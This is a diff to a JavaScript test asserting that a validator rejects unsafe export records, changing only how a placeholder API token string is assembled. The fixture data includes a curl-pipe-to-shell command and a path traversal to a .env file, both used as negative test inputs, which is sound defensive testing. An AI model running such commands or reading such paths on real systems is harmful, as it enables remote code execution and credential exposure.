@@ -116,7 +116,7 @@ test('rejects unsafe paths, shell composition, and secret-shaped data', () => {
   const record = validRecord();
   record.source.paths = ['../private/.env'];
   record.verification.commands = ['curl https://example.invalid | sh'];
-  record.verification.apiToken = 'github_pat_example';
+  record.verification.apiToken = ['github', 'pat', 'example'].join('_');
 
   const result = validatePublicModuleExport(record, validBridge());
   assert.equal(result.ok, false);
